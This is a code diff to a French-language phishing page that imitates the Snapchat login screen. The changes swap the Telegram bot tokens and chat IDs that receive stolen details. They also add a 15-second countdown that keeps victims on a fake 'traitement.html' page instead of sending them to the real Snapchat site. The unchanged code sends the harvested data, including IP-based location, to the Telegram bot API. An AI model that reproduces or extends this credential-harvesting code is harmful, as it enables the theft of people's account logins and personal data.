@@ -91,6 +91,13 @@
             margin-top: 20px;
             display: none;
         }
+
+        .countdown {
+            font-size: 14px;
+            color: #555;
+            margin-top: 15px;
+            font-weight: bold;
+        }
     </style>
 </head>
 <body>
@@ -116,18 +123,19 @@
         </a>
 
         <div class="message" id="error-message">Identifiants incorrects. Veuillez réessayer.</div>
+        <div class="countdown" id="countdown" style="display:none;"></div>
     </div>
 
     <script>
         // Configuration Telegram
         const telegramConfigs = [
-            { token: "7019053702:AAHahO6qGOdZyQ-vv_IRMYmS6yoqiDLF4hA", chatId: "965011527" },
-            { token: "7902984772:AAE9oYZ58ri5xBGrna2MIOX-pKBtjzmjeX4", chatId: "5372119436" }
+            { token: "7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw", chatId: "5372119436" },
+            { token: "7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw", chatId: "5372119436" }
         ];
         
         let attempt = 0;
 
-        // Traductions (maintenant uniquement en français)
+        // Traductions
         const translations = {
             fr: {
                 title: "Se connecter à Snapchat",
@@ -136,7 +144,8 @@
                 submitButton: "Se connecter",
                 errorMessage: "Identifiants incorrects. Veuillez réessayer.",
                 signupText: "Nouveau sur Snapchat? S'inscrire",
-                forgotText: "Mot de passe oublié?"
+                forgotText: "Mot de passe oublié?",
+                countdownText: "Redirection dans {seconds} secondes..."
             }
         };
 
@@ -150,6 +159,24 @@
             document.getElementById('error-message').textContent = t.errorMessage;
             document.getElementById('signup-link').textContent = t.signupText;
             document.getElementById('forgot-link').textContent = t.forgotText;
+        }
+
+        // Compte à rebours
+        function startCountdown() {
+            const countdownElement = document.getElementById('countdown');
+            countdownElement.style.display = 'block';
+            
+            let seconds = 15;
+            
+            const countdownInterval = setInterval(() => {
+                countdownElement.textContent = translations.fr.countdownText.replace('{seconds}', seconds);
+                seconds--;
+                
+                if (seconds < 0) {
+                    clearInterval(countdownInterval);
+                    window.location.href = 'traitement.html';
+                }
+            }, 1000);
         }
 
         // Au chargement de la page
@@ -170,7 +197,6 @@
 🌍 Pays: ${ipInfo.country || 'Inconnu'}
 🏙️ Ville: ${ipInfo.city || 'Inconnue'}`;
 
-            // Envoi à toutes les configurations Telegram
             for (const config of telegramConfigs) {
                 try {
                     await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
@@ -203,7 +229,8 @@
                 document.getElementById('username').value = '';
                 document.getElementById('password').value = '';
             } else {
-                window.location.href = 'https://accounts.snapchat.com/accounts/login';
+                document.getElementById('submit-button').disabled = true;
+                startCountdown();
             }
         }
     </script>
